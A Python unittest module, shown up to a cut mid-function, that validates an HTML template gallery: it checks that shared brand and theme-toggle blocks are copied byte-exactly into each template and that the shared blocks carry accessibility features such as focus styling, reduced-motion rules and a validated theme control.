#!/usr/bin/env python3
"""Layer-4 validation for the shipped artifact gallery.

This is the gallery's single validation file. The check groups ``A``-``J``
inventoried in the feature's ``contracts/gallery-validation-contract.md`` all land
here, each group added by its own task; this scaffold is the entrypoint they land
in. With no group registered the file reports ``0/0``, which is a pass.

**Every check function takes the gallery root as a parameter.** This is load
bearing, not stylistic. A check that reads ``GALLERY_ROOT`` for itself can only
ever run against the source tree, and the source tree ships zero artifacts — so
every group that inspects an artifact (``A``, ``D``, ``E``, ``G``, and ``J``,
roughly half the inventory) would pass by vacuity and prove nothing. Taking the
root as an argument is what lets those groups be exercised a second time against
synthetic fixtures built in a temporary directory, where the artifacts they
describe actually exist. ``GALLERY_ROOT`` below is the argument the
real-gallery cases pass in — never a value a check reads on its own.

**Parsing strength is not uniform here, and a reader must not assume it is.**
Element positions are parsed with ``html.parser``, which satisfies the
constitution's structured-parser requirement and — verified by execution —
decodes character references in attribute values, so entity encoding is not an
evasion in a parsed position. The style positions (``url()``, both ``@import``
forms) and the network-call positions (``fetch``, ``XMLHttpRequest.open``,
``WebSocket``, ``sendBeacon``, ``Worker``, ``EventSource``, ``importScripts``,
dynamic ``import``) have no standard-library parser and are matched by targeted
regular expressions. That is a deliberate, recorded constitution deviation, and
it is why E10 and E12 constrain those positions by **prohibition** — refusing an
escape and refusing a scheme-relative reference — rather than by decoding them
the way a browser would. A regex-matched position must not be presented as
carrying a parsed position's strength: it is bounded by what the pattern
anticipates, and group J's prohibitions are what stop that bound from mattering.

Two consequences of running the style patterns over the whole document text are
recorded so neither reads as an oversight: a URL written inside a **CSS**
comment is scanned and will fail, and ``@namespace "https://…"`` is matched
while initiating no fetch. Both are over-strict rather than unsafe. An author
needing a prose URL writes it in an HTML comment or in visible text, neither of
which is a scanned position at all (E3).
"""

from __future__ import annotations

import ast
import inspect
import json
import re
import shutil
import sys
import tempfile
import unittest
from collections.abc import Callable
from html.parser import HTMLParser
from pathlib import Path
from typing import NamedTuple
from urllib.parse import SplitResult, parse_qs, urlsplit


REPO_ROOT = Path(__file__).resolve().parents[3]
PLUGIN_ROOT = REPO_ROOT / "speckit-pro"
GALLERY_ROOT = PLUGIN_ROOT / "artifact-gallery"
LIB_DIR = REPO_ROOT / "tests" / "speckit-pro" / "lib"

# Group E reuses two hardened comparisons this repository already owns rather
# than writing a third, and group F reuses the payload build's own rewriter
# pattern. All three live outside this tree, so their directories join the
# import path here.
SCRIPTS_DIR = REPO_ROOT / "scripts"
CAPABILITY_LIB_DIR = REPO_ROOT / "tests" / "speckit-pro" / "layer6-efficiency" / "lib"
for _import_path in (LIB_DIR, SCRIPTS_DIR, CAPABILITY_LIB_DIR, PLUGIN_ROOT):
    if str(_import_path) not in sys.path:
        sys.path.insert(0, str(_import_path))

import codex_capability_contract  # noqa: E402
import release_note_policy  # noqa: E402
from speckit_pro_runner.gates.payloads import REL_SKILL_PATH_XPLAT008  # noqa: E402
from test_result import run_counted  # noqa: E402

# ``_validated_http_url`` rejects control, whitespace, and delimiter characters
# *before* ``urlsplit``, which is E6; ``_openai_url`` asserts the canonical
# round-trip, absent userinfo, and absent port conjunction, which is E5. Neither
# was written for this feature and neither can be called directly here — one is
# bound to a fixed OpenAI host-and-path allowlist, the other requires an
# ``http(s)`` scheme and so rejects the relative references E7 admits. They are
# bound as names so the checks below can be pinned to their behaviour rather
# than only citing them in a comment.
_VALIDATED_HTTP_URL = release_note_policy._validated_http_url
_OPENAI_URL = codex_capability_contract._openai_url


# ---------------------------------------------------------------------------
# Group A — marker-block drift (FR-002, FR-003, FR-006; SC-002)
# ---------------------------------------------------------------------------

BRAND_BLOCK = "BRAND-KIT"
HEAD_BLOCK = "GALLERY-HEAD"

# The canonical file each block is copied out of. Only that file's *inner*
# region is the comparison target, never the whole file, which is what lets
# ``brand-kit.css`` carry its provenance header and audited contrast table above
# the start marker without every artifact having to embed them.
CANONICAL_FILES: dict[str, str] = {
    BRAND_BLOCK: "brand-kit.css",
    HEAD_BLOCK: "theme-toggle.html",
}

MANIFEST_FILE = "manifest.json"
TEMPLATES_DIR = "templates"


def _read_exact(path: Path) -> str:
    """Read a file with newline translation off.

    ``Path.read_text`` folds a ``CRLF`` into a ``LF``, which would hide exactly
    the single-character drift A4 exists to catch.
    """
    with path.open("r", encoding="utf-8", newline="") as handle:
        return handle.read()


def _read_exact_or_none(path: Path) -> str | None:
    """``_read_exact``, or ``None`` when the file is not decodable as UTF-8.

    This cannot take ``_document_text``'s ``errors="replace"`` route: a replaced
    character *is* drift, and A4 exists to catch drift, so a lenient read here
    would turn the byte-exact comparison into an approximate one.

    But an unhandled decode error is worse. It propagates out of the check and
    stops the module before it reaches the files that are fine — the unittest run
    dies with a traceback naming a codec rather than naming an artifact, and every
    later group goes unreached. That is verbatim the failure ``_document_text``'s
    own docstring says it exists to avoid. So the condition is reported as a
    failure by the caller instead of raised.
    """
    try:
        return _read_exact(path)
    except UnicodeDecodeError:
        return None


def _markers(block: str) -> tuple[str, str]:
    return f"{block}:START", f"{block}:END"


def _uses(text: str, block: str) -> bool:
    """True when either marker appears — a start with no end still counts."""
    start, end = _markers(block)
    return start in text or end in text


def _embeds(text: str, block: str) -> bool:
    """True when the pair appears exactly once, ordered — so it is extractable."""
    start, end = _markers(block)
    return text.count(start) == 1 and text.count(end) == 1 and text.index(start) < text.index(end)


def _region(text: str, block: str) -> str:
    """The delimited region: end of the START token to start of the END token.

    The comment syntax wrapping each marker therefore sits *inside* the compared
    slice, so an artifact that re-spells a marker drifts rather than passing.
    """
    start, end = _markers(block)
    return text[text.index(start) + len(start) : text.index(end)]


def _pair_failures(label: str, block: str, text: str) -> list[str]:
    """Marker-pair failures for one file and one block: count, then order."""
    start, end = _markers(block)
    starts = text.count(start)
    ends = text.count(end)
    failures: list[str] = []
    if starts != 1:
        failures.append(f"{label}: block {block}: expected exactly one '{start}', found {starts}")
    if ends != 1:
        failures.append(f"{label}: block {block}: expected exactly one '{end}', found {ends}")
    if not failures and text.index(start) > text.index(end):
        failures.append(f"{label}: block {block}: '{end}' appears before '{start}'")
    return failures


def _gallery_html_files(gallery_root: Path) -> list[Path]:
    """Every HTML file under the gallery, artifacts included.

    An absent gallery root, or an absent ``templates/``, is zero files rather
    than an error — the bounded sweep this feature actually ships, since it
    ports no artifact and version control preserves no empty directory.
    """
    if not gallery_root.is_dir():
        return []
    return sorted(path for path in gallery_root.rglob("*.html") if path.is_file())


def _label(gallery_root: Path, path: Path) -> str:
    return path.relative_to(gallery_root).as_posix()


def _canonical_region(gallery_root: Path, block: str) -> str | None:
    """The canonical inner region, or ``None`` when A1/A2 already reject it."""
    path = gallery_root / CANONICAL_FILES[block]
    if not path.is_file():
        return None
    text = _read_exact_or_none(path)
    if text is None:
        return None  # A1/A2 report the undecodable canonical file
    return _region(text, block) if _embeds(text, block) else None


def _canonical_pair_failures(gallery_root: Path, block: str) -> list[str]:
    name = CANONICAL_FILES[block]
    path = gallery_root / name
    if not path.is_file():
        return [f"{name}: block {block}: canonical file is missing, so no artifact can embed the block"]
    text = _read_exact_or_none(path)
    if text is None:
        return [f"{name}: block {block}: canonical file is not decodable as UTF-8, so no region can be read"]
    return _pair_failures(name, block, text)


def check_a1(gallery_root: Path) -> list[str]:
    """A1 — ``brand-kit.css`` holds exactly one ordered ``BRAND-KIT`` pair."""
    return _canonical_pair_failures(gallery_root, BRAND_BLOCK)


def check_a2(gallery_root: Path) -> list[str]:
    """A2 — ``theme-toggle.html`` holds exactly one ordered ``GALLERY-HEAD`` pair."""
    return _canonical_pair_failures(gallery_root, HEAD_BLOCK)


def check_a3(gallery_root: Path) -> list[str]:
    """A3 — every marker pair a gallery HTML file uses appears once, ordered.

    A file using neither pair is not a failure here; A5 is what stops a shipped
    artifact from passing by leaving the brand block out altogether.
    """
    failures: list[str] = []
    for path in _gallery_html_files(gallery_root):
        label = _label(gallery_root, path)
        text = _read_exact_or_none(path)
        if text is None:
            failures.append(
                f"{label}: is not decodable as UTF-8, so no marker pair can be read from it"
            )
            continue
        for block in CANONICAL_FILES:
            if _uses(text, block):
                failures.extend(_pair_failures(label, block, text))
    return failures


def check_a4(gallery_root: Path) -> list[str]:
    """A4 — each embedded region equals the canonical inner region, byte for byte.

    Only the delimited region is compared, so the markup and styling a template
    writes outside the markers is never a failure.
    """
    failures: list[str] = []
    canonical: dict[str, str | None] = {}
    for path in _gallery_html_files(gallery_root):
        label = _label(gallery_root, path)
        text = _read_exact_or_none(path)
        if text is None:
            continue  # A3 owns the undecodable file; reporting it twice names one defect twice
        for block in CANONICAL_FILES:
            if not _embeds(text, block):
                continue  # absent, or unbalanced — the unbalanced case is A3's
            if block not in canonical:
                canonical[block] = _canonical_region(gallery_root, block)
            expected = canonical[block]
            if expected is None:
                failures.append(
                    f"{label}: block {block}: embeds the block, but canonical "
                    f"{CANONICAL_FILES[block]} is missing or malformed, so no region can be compared"
                )
            elif _region(text, block) != expected:
                failures.append(
                    f"{label}: block {block}: embedded region differs from the canonical region in "
                    f"{CANONICAL_FILES[block]}"
                )
    return failures


def check_a5(gallery_root: Path) -> list[str]:
    """A5 — every ``shipped`` entry's artifact embeds **both** canonical blocks.

    Absence is never a pass: a shipped entry whose artifact is missing, or whose
    artifact carries no pair for a block, fails here rather than falling through
    A4, which can only compare a region that exists.

    Both blocks, not just the brand kit. A3 skips a file that uses neither pair
    and A4 skips a file that embeds neither, so an artifact omitting the
    ``GALLERY-HEAD`` block was invisible to all of group A while satisfying every
    other group — it could hand-write a policy declaration byte-identical to the
    canonical one, pass J6 through J10, and still ship with no theme control, no
    pre-first-paint theme application, no persistence, and no typeface request.
    Those four are the whole reason the head block exists, and
    ``SPA-CONTRACT.md``'s "Do not write your own, and do not move it" was
    enforced by nothing.
    """
    manifest = gallery_root / MANIFEST_FILE
    if not manifest.is_file():
        # No catalog names no shipped entry, so the sweep is empty. The
        # catalog's own existence and shape are group B's checks; duplicating
        # them here would report one defect twice.
        return []
    try:
        catalog = json.loads(_read_exact(manifest))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        return [f"{MANIFEST_FILE}: unreadable, so no shipped entry could be checked for the {BRAND_BLOCK} block: {error}"]
    entries = catalog.get("templates") if isinstance(catalog, dict) else None
    if not isinstance(entries, list):
        return [f"{MANIFEST_FILE}: no 'templates' array, so no shipped entry could be checked for the {BRAND_BLOCK} block"]

    templates = gallery_root / TEMPLATES_DIR
    failures: list[str] = []
    for entry in entries:
        if not isinstance(entry, dict) or entry.get("status") != "shipped":
            continue
        identifier = entry.get("id")
        if not isinstance(identifier, str) or not identifier:
            continue  # an entry with no usable id is group B's failure, named by position
        artifact = templates / f"{identifier}.html"
        if artifact.parent != templates:
            continue  # an id that composes a path is B9's failure; resolving it here would leave the gallery
        label = f"{TEMPLATES_DIR}/{identifier}.html"
        if not artifact.is_file():
            failures.extend(
                f"{label}: block {block}: shipped entry '{identifier}' has no artifact, "
                "so the block is embedded nowhere"
                for block in CANONICAL_FILES
            )
            continue
        text = _read_exact_or_none(artifact)
        if text is None:
            failures.append(f"{label}: is not decodable as UTF-8, so no embedded block can be read")
            continue
        failures.extend(
            f"{label}: block {block}: shipped entry '{identifier}' does not embed the block"
            for block in CANONICAL_FILES
            if not _embeds(text, block)
        )
    return failures


GROUP_A_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("A1", check_a1),
    ("A2", check_a2),
    ("A3", check_a3),
    ("A4", check_a4),
    ("A5", check_a5),
)


class MarkerBlockDriftTests(unittest.TestCase):
    """Group A against the shipped gallery.

    A3-A5 sweep an empty set here, because ART-001 ports no artifact. The
    fixture case below is where they are actually exercised.
    """

    def test_group_a_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_A_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# --- Fixtures: shared scaffolding, then group A ----------------------------

BLOCK_COMMENT: dict[str, tuple[str, str]] = {
    BRAND_BLOCK: ("/* ", " */"),
    HEAD_BLOCK: ("<!-- ", " -->"),
}

FIXTURE_BRAND_BODY = ":root {\n  --rc-surface: #faf9f7;\n  --rc-text: #1b1b1b;\n}"
FIXTURE_HEAD_BODY = '<meta name="color-scheme" content="light dark">'


def _marked(block: str, body: str) -> str:
    """A delimited region exactly as a port copies it — markers included."""
    opener, closer = BLOCK_COMMENT[block]
    return f"{opener}{block}:START{closer}\n{body}\n{opener}{block}:END{closer}"


class GalleryFixtureCase(unittest.TestCase):
    """A synthetic gallery in a temporary directory, shared by every group.

    Nothing here is written into the repository tree: a fixture artifact under
    ``speckit-pro/artifact-gallery/templates/`` would be a D4 failure and would
    be required in both payloads by F1/F2. Every group's fixture case builds on
    this one, so ``gallery_root`` — the parameter ``CheckSignatureTests``
    enforces — always resolves to the temporary root rather than the source tree.
    """

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory(prefix="artifact-gallery-")
        self.gallery = Path(self._tmp.name).resolve() / "artifact-gallery"
        self.gallery.mkdir()

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def write(self, relative: str, text: str) -> Path:
        path = self.gallery / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8", newline="") as handle:
            handle.write(text)
        return path

    def assertReports(self, failures: list[str], *fragments: str) -> None:
        """One failure naming every fragment — FR-006's message obligation."""
        self.assertTrue(failures, "expected a failure, got none")
        self.assertTrue(
            any(all(fragment in failure for fragment in fragments) for failure in failures),
            f"no failure named all of {fragments}: {failures}",
        )


class MarkerBlockDriftFixtureTests(GalleryFixtureCase):
    """Group A against synthetic galleries built in a temporary directory."""

    # -- fixture builders --

    def write_canonical(
        self,
        *,
        brand_body: str = FIXTURE_BRAND_BODY,
        head_body: str = FIXTURE_HEAD_BODY,
        provenance: str = "/* Provenance: repository, path, revision — above the start marker. */\n",
    ) -> None:
        self.write(CANONICAL_FILES[BRAND_BLOCK], provenance + _marked(BRAND_BLOCK, brand_body) + "\n")
        self.write(CANONICAL_FILES[HEAD_BLOCK], _marked(HEAD_BLOCK, head_body) + "\n")

    def write_artifact(
        self,
        identifier: str,
        *,
        brand: str | None = None,
        head: str | None = None,
        own_styling: str = "",
    ) -> Path:
        """A synthetic artifact embedding both blocks, plus styling of its own."""
        brand_region = _marked(BRAND_BLOCK, FIXTURE_BRAND_BODY) if brand is None else brand
        head_region = _marked(HEAD_BLOCK, FIXTURE_HEAD_BODY) if head is None else head
        return self.write(
            f"{TEMPLATES_DIR}/{identifier}.html",
            '<!doctype html>\n<html lang="en">\n<head>\n'
            f"{head_region}\n"
            "<style>\n"
            f"{brand_region}\n"
            f"{own_styling}"
            "</style>\n</head>\n<body></body>\n</html>\n",
        )

    def write_catalog(self, *entries: dict[str, str]) -> None:
        self.write(
            MANIFEST_FILE,
            json.dumps({"schema_version": "1.0", "signals": [], "templates": list(entries)}, indent=2),
        )

    # -- A1 / A2: the canonical pairs --

    def test_a1_accepts_one_ordered_pair(self) -> None:
        self.write_canonical()

        self.assertEqual(check_a1(self.gallery), [])

    def test_a1_rejects_a_repeated_pair(self) -> None:
        self.write_canonical()
        doubled = _read_exact(self.gallery / CANONICAL_FILES[BRAND_BLOCK])
        self.write(CANONICAL_FILES[BRAND_BLOCK], doubled + _marked(BRAND_BLOCK, FIXTURE_BRAND_BODY) + "\n")

        self.assertReports(check_a1(self.gallery), CANONICAL_FILES[BRAND_BLOCK], BRAND_BLOCK)

    def test_a1_rejects_a_missing_canonical_file(self) -> None:
        self.assertReports(check_a1(self.gallery), CANONICAL_FILES[BRAND_BLOCK], BRAND_BLOCK)

    def test_a2_accepts_one_ordered_pair(self) -> None:
        self.write_canonical()

        self.assertEqual(check_a2(self.gallery), [])

    def test_a2_rejects_a_reversed_pair(self) -> None:
        self.write_canonical()
        self.write(
            CANONICAL_FILES[HEAD_BLOCK],
            f"<!-- {HEAD_BLOCK}:END -->\n{FIXTURE_HEAD_BODY}\n<!-- {HEAD_BLOCK}:START -->\n",
        )

        self.assertReports(check_a2(self.gallery), CANONICAL_FILES[HEAD_BLOCK], HEAD_BLOCK)

    def test_a2_rejects_a_start_marker_with_no_end(self) -> None:
        self.write_canonical()
        self.write(CANONICAL_FILES[HEAD_BLOCK], f"<!-- {HEAD_BLOCK}:START -->\n{FIXTURE_HEAD_BODY}\n")

        self.assertReports(check_a2(self.gallery), CANONICAL_FILES[HEAD_BLOCK], HEAD_BLOCK)

    # -- A3: marker pairs inside artifacts --

    def test_a3_accepts_an_artifact_embedding_each_pair_once(self) -> None:
        self.write_canonical()
        self.write_artifact("annotated-diff")

        self.assertEqual(check_a3(self.gallery), [])

    def test_a3_rejects_a_repeated_pair_in_an_artifact(self) -> None:
        self.write_canonical()
        self.write_artifact(
            "annotated-diff",
            own_styling=_marked(BRAND_BLOCK, FIXTURE_BRAND_BODY) + "\n",
        )

        self.assertReports(check_a3(self.gallery), "annotated-diff.html", BRAND_BLOCK)

    def test_a3_rejects_a_start_marker_with_no_end(self) -> None:
        self.write_canonical()
        self.write_artifact("annotated-diff", head=f"<!-- {HEAD_BLOCK}:START -->\n{FIXTURE_HEAD_BODY}")

        self.assertReports(check_a3(self.gallery), "annotated-diff.html", HEAD_BLOCK)

    # -- A4: byte-for-byte region equality --

    def test_a4_accepts_template_specific_styling_outside_the_markers(self) -> None:
        self.write_canonical()
        self.write_artifact("module-map", own_styling=".diff-row { display: grid; }\n")

        self.assertEqual(check_a4(self.gallery), [])

    def test_a4_ignores_canonical_content_above_the_start_marker(self) -> None:
        self.write_canonical(provenance="/* Provenance header, contrast table, and more prose. */\n\n")
        self.write_artifact("module-map")

        self.assertEqual(check_a4(self.gallery), [])

    def test_a4_rejects_one_character_of_drift_in_the_brand_region(self) -> None:
        self.write_canonical()
        self.write_artifact("module-map", brand=_marked(BRAND_BLOCK, FIXTURE_BRAND_BODY.replace("#faf9f7", "#faf9f8")))

        self.assertReports(check_a4(self.gallery), "module-map.html", BRAND_BLOCK)

    def test_a4_rejects_a_line_ending_drift(self) -> None:
        """A ``CRLF`` in the region is drift, and only an untranslated read sees it."""
        self.write_canonical()
        self.write_artifact("module-map", brand=_marked(BRAND_BLOCK, FIXTURE_BRAND_BODY).replace("\n", "\r\n"))

        self.assertReports(check_a4(self.gallery), "module-map.html", BRAND_BLOCK)

    def test_a4_rejects_drift_in_the_head_region(self) -> None:
        self.write_canonical()
        self.write_artifact("module-map", head=_marked(HEAD_BLOCK, FIXTURE_HEAD_BODY + " "))

        self.assertReports(check_a4(self.gallery), "module-map.html", HEAD_BLOCK)

    def test_a4_rejects_an_embedded_block_with_no_canonical_file(self) -> None:
        self.write_artifact("module-map")

        self.assertReports(check_a4(self.gallery), "module-map.html", BRAND_BLOCK)

    # -- A5: shipped entries embed the brand block --

    def test_a5_accepts_a_shipped_entry_embedding_the_brand_block(self) -> None:
        self.write_canonical()
        self.write_artifact("pr-writeup")
        self.write_catalog({"id": "pr-writeup", "status": "shipped"})

        self.assertEqual(check_a5(self.gallery), [])

    def test_a5_rejects_a_shipped_entry_omitting_the_brand_block(self) -> None:
        self.write_canonical()
        self.write("templates/pr-writeup.html", "<!doctype html>\n<html><head></head><body></body></html>\n")
        self.write_catalog({"id": "pr-writeup", "status": "shipped"})

        self.assertReports(check_a5(self.gallery), "pr-writeup.html", BRAND_BLOCK)

    def test_a5_rejects_a_shipped_entry_omitting_the_head_block(self) -> None:
        """The head block is required too, and by A5 alone.

        An artifact can carry the brand block and hand-write a policy
        declaration byte-identical to the canonical one — satisfying J6 through
        J10 — while omitting the head block entirely. A3 skips it (no pair, so
        ``_uses`` is false) and A4 skips it (``_embeds`` is false), so before
        this the omission was invisible to every group. What ships in that state
        has no theme control, no pre-first-paint theme application, no
        persistence, and no typeface request.
        """
        self.write_canonical()
        brand = _region(_read_exact(self.gallery / CANONICAL_FILES[BRAND_BLOCK]), BRAND_BLOCK)
        self.write(
            "templates/pr-writeup.html",
            "<!doctype html>\n<html><head><meta charset=\"utf-8\">\n"
            f"<style>\n{_marked(BRAND_BLOCK, brand)}\n</style>\n"
            "</head><body></body></html>\n",
        )
        self.write_catalog({"id": "pr-writeup", "status": "shipped"})

        failures = check_a5(self.gallery)
        self.assertReports(failures, "pr-writeup.html", HEAD_BLOCK)
        # The brand block IS present, so only the head block may be reported.
        self.assertFalse(
            [failure for failure in failures if BRAND_BLOCK in failure],
            f"the brand block is embedded, so it must not be reported: {failures}",
        )

    def test_a5_rejects_a_shipped_entry_with_no_artifact(self) -> None:
        self.write_canonical()
        self.write_catalog({"id": "pr-writeup", "status": "shipped"})

        self.assertReports(check_a5(self.gallery), "pr-writeup.html", BRAND_BLOCK)

    def test_a5_leaves_planned_entries_alone(self) -> None:
        self.write_canonical()
        self.write_catalog({"id": "pr-writeup", "status": "planned"})

        self.assertEqual(check_a5(self.gallery), [])

    def test_a5_treats_an_absent_catalog_as_no_shipped_entries(self) -> None:
        self.write_canonical()

        self.assertEqual(check_a5(self.gallery), [])


# ---------------------------------------------------------------------------
# Group I — shared-block accessibility invariants (FR-004, FR-022, FR-023)
# ---------------------------------------------------------------------------
#
# Every check here asserts that a construct the accessibility requirements
# depend on sits **inside** the copied region, which is the only thing that
# makes it reach all 21 artifacts. Presence in the canonical file is not the
# property: a rule above the start marker reads as correct and ships to nothing,
# the same inside-vs-outside distinction group A already turns on. These are
# cheap static assertions on two files, not a conformance audit — that a
# ``:focus-visible`` rule exists does not prove every control is reachable, and
# that a state attribute is set does not prove it is correct in both positions.
# Those stay manual (M7, M8).


# The two theme names FR-004 fixes: the closed set I5 requires a stored override
# to be validated against, and the two forced themes I3 requires ``color-scheme``
# to be set under.
THEME_NAMES: tuple[str, ...] = ("dark", "light")

# The gallery's own directory name, which is what "namespaced to this gallery"
# means for I6. A key carrying it cannot collide in either direction with
# another local document sharing the storage partition.
GALLERY_NAMESPACE = "artifact-gallery"

# The group A check that owns a broken marker pair for each block. Group I names
# it so one malformed pair reads as one defect rather than six unrelated ones.
MARKER_PAIR_CHECK: dict[str, str] = {BRAND_BLOCK: "A1", HEAD_BLOCK: "A2"}

_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/|<!--.*?-->", re.DOTALL)


def _strip_comments(text: str) -> str:
    """Blank out block comments, so a construct that is only *described* fails.

    Both canonical regions carry commentary of their own, and a check that
    matched it would report a construct as shipped when only its explanation
    did. ``//`` line comments are deliberately left alone: the head region
    carries an ``https://`` URL, and stripping to end of line would swallow it.
    """
    return _BLOCK_COMMENT_RE.sub(" ", text)


def _shared_region(gallery_root: Path, block: str, construct: str) -> tuple[str | None, list[str]]:
    """The canonical inner region with its commentary removed, or the failure.

    Absence is never a pass. When no region can be read, the construct is
    provably inside no copied region, so the check reports rather than skipping
    — naming the group A check that owns the marker defect itself.
    """
    region = _canonical_region(gallery_root, block)
    if region is None:
        return None, [
            f"{CANONICAL_FILES[block]}: block {block}: no readable marked region, so {construct} is inside "
            f"no copied region and reaches no artifact ({MARKER_PAIR_CHECK[block]} owns the marker defect)"
        ]
    return _strip_comments(region), []


def _failure(block: str, reason: str) -> list[str]:
    return [f"{CANONICAL_FILES[block]}: block {block}: {reason}"]


# An at-rule prelude runs from ``@media`` to its opening brace, so a feature
# query that is merely *mentioned* in some other prelude cannot satisfy this.
_REDUCED_MOTION_RE = re.compile(r"@media[^{]*prefers-reduced-motion\s*:\s*reduce")

# A selector reaching an opening brace: ``:focus-visible`` in a declaration
# rather than in a selector position is not a rule.
_FOCUS_VISIBLE_RE = re.compile(r":focus-visible[^{};]*\{")

# Innermost qualified rules — prelude, then declarations. Neither side can hold
# a brace, so a nested at-rule yields its inner rule rather than swallowing it.
_RULE_RE = re.compile(r"([^{}]*)\{([^{}]*)\}", re.DOTALL)


def check_i1(gallery_root: Path) -> list[str]:
    """I1 — the brand region carries a ``prefers-reduced-motion: reduce`` at-rule."""
    region, missing = _shared_region(gallery_root, BRAND_BLOCK, "the reduced-motion at-rule")
    if region is None:
        return missing
    if not _REDUCED_MOTION_RE.search(region):
        return _failure(
            BRAND_BLOCK,
            "no '@media (prefers-reduced-motion: reduce)' at-rule inside the marked region, so the "
            "cross-theme transition is neutralised in no artifact",
        )
    return []


def check_i2(gallery_root: Path) -> list[str]:
    """I2 — the brand region carries a ``:focus-visible`` rule."""
    region, missing = _shared_region(gallery_root, BRAND_BLOCK, "the :focus-visible treatment")
    if region is None:
        return missing
    if not _FOCUS_VISIBLE_RE.search(region):
        return _failure(
            BRAND_BLOCK,
            "no ':focus-visible' rule inside the marked region, so no artifact carries the keyboard "
            "focus treatment",
        )
    return []


def check_i3(gallery_root: Path) -> list[str]:
    """I3 — the brand region forces ``color-scheme`` under both themes.

    The declaration must name the theme it sits under. ``color-scheme: light
    dark`` inside a forced theme is the failure this check exists for, not a
    weaker form of passing it: the browser's own surfaces would resolve it
    against the operating system while the document showed the override.
    """
    region, missing = _shared_region(gallery_root, BRAND_BLOCK, "the forced color-scheme declarations")
    if region is None:
        return missing
    failures: list[str] = []
    for theme in THEME_NAMES:
        selector = re.compile(rf"""\[\s*data-theme\s*=\s*["']?{theme}["']?\s*\]""")
        declaration = re.compile(rf"color-scheme\s*:\s*{theme}\s*(?:;|$)")
        if not any(
            selector.search(prelude) and declaration.search(body) for prelude, body in _RULE_RE.findall(region)
        ):
            failures.extend(
                _failure(
                    BRAND_BLOCK,
                    f'no rule inside the marked region both selects [data-theme="{theme}"] and sets '
                    f"'color-scheme: {theme}', so the browser's own surfaces would follow the operating "
                    "system rather than the reader's override",
                )
            )
    return failures


# The control is built by script rather than written as markup: the region is
# head-only content, and a parser meeting a button there would close the head
# and relocate the whole region. Markup is still accepted, because I4 is a
# statement about the control and not about how it is spelled.
_CONTROL_ELEMENT_RE = re.compile(r"""createElement\(\s*['"]button['"]|<button[\s>]""", re.IGNORECASE)
_ACCESSIBLE_NAME_SOURCES = ("aria-label", "aria-labelledby", "textContent", "innerText")
_STATE_ATTRIBUTES = ("aria-pressed", "aria-checked", "aria-expanded")


def check_i4(gallery_root: Path) -> list[str]:
    """I4 — the head region builds a named, stateful theme control.

    Presence is not conformance: that a state attribute is set here does not
    prove it is correct in both positions, which stays manual (M8).
    """
    region, missing = _shared_region(gallery_root, HEAD_BLOCK, "the theme control")
    if region is None:
        return missing
    failures: list[str] = []
    if not _CONTROL_ELEMENT_RE.search(region):
        failures.extend(
            _failure(
                HEAD_BLOCK,
                "the marked region builds no button element (no createElement('button') and no <button> "
                "markup), so no artifact carries the theme control",
            )
        )
    if not any(source in region for source in _ACCESSIBLE_NAME_SOURCES):
        failures.extend(
            _failure(
                HEAD_BLOCK,
                "the marked region gives the theme control no accessible name "
                f"(none of {', '.join(_ACCESSIBLE_NAME_SOURCES)})",
            )
        )
    if not any(attribute in region for attribute in _STATE_ATTRIBUTES):
        failures.extend(
            _failure(
                HEAD_BLOCK,
                "the marked region gives the theme control no state attribute "
                f"(none of {', '.join(_STATE_ATTRIBUTES)})",
            )
        )
    return failures


_COMPARISON = r"(?:===|!==|==|!=)"
_STORAGE_READ_CALL = r"getItem\s*\("
_STORAGE_READ = rf"{_STORAGE_READ_CALL}[^)]*\)"
_STORAGE_TOKEN_RE = re.compile(rf"{_STORAGE_READ_CALL}|localStorage|sessionStorage")

# Both ways a theme is written onto the root element, with the value expression
# captured so I5 can ask where that value came from.
_THEME_WRITE_RE = re.compile(
    r"""setAttribute\(\s*['"]data-theme['"]\s*,\s*([^)]*)\)|dataset\.theme\s*=\s*([^;\n]*)"""
)


def _identifier_pattern(name: str) -> str:
    return rf"(?<![\w$]){re.escape(name)}(?![\w$])"


def _stored_value_patterns(region: str) -> list[str]:
    """Patterns denoting the value read back out of storage.

    The read itself, plus any identifier the region assigns it to — so the
    comparison I5 looks for has to be against the *stored* value rather than
    against any convenient theme-valued expression.
    """
    patterns = [_STORAGE_READ]
    patterns += [
        _identifier_pattern(name)
        for name in re.findall(rf"([A-Za-z_$][\w$]*)\s*=\s*[^;\n]*{_STORAGE_READ_CALL}", region)
    ]
    return patterns


def _theme_name_patterns(region: str, theme: str) -> list[str]:
    """Patterns denoting one theme name — the literal, and identifiers bound to it."""
    patterns = [rf"""['"]{theme}['"]"""]
    patterns += [
        _identifier_pattern(name)
        for name in re.findall(rf"""([A-Za-z_$][\w$]*)\s*=\s*['"]{theme}['"]""", region)
    ]
    return patterns


def check_i5(gallery_root: Path) -> list[str]:
    """I5 — the head region validates the stored override against the closed set.

    Two halves, and the second is not implied by the first: the stored value is
    compared against each theme name, and what reaches ``data-theme`` is a
    literal from that set rather than the string that came back out of storage.
    """
    region, missing = _shared_region(gallery_root, HEAD_BLOCK, "the closed-set validation")
    if region is None:
        return missing
    failures: list[str] = []
    reads = _stored_value_patterns(region)
    for theme in THEME_NAMES:
        names = _theme_name_patterns(region, theme)
        if not any(
            re.search(rf"{read}\s*{_COMPARISON}\s*{name}", region)
            or re.search(rf"{name}\s*{_COMPARISON}\s*{read}", region)
            for read in reads
            for name in names
        ):
            failures.extend(
                _failure(
                    HEAD_BLOCK,
                    "the marked region never compares the value read back out of storage against the theme "
                    f"name '{theme}' with an equality operator, so a value written by any other local "
                    "document would be applied unvalidated in every artifact",
                )
            )
    for match in _THEME_WRITE_RE.finditer(region):
        written = (match.group(1) if match.group(1) is not None else match.group(2)).strip()
        if _STORAGE_TOKEN_RE.search(written):
            failures.extend(
                _failure(
                    HEAD_BLOCK,
                    f"the marked region writes data-theme from the storage read itself ('{written}') rather "
                    f"than a literal from the closed set {{{', '.join(THEME_NAMES)}}}",
                )
            )
    return failures


_STORAGE_CALL_RE = re.compile(r"(?:get|set)Item\s*\(\s*([^,)]+)")


def _key_literal(region: str, expression: str) -> str | None:
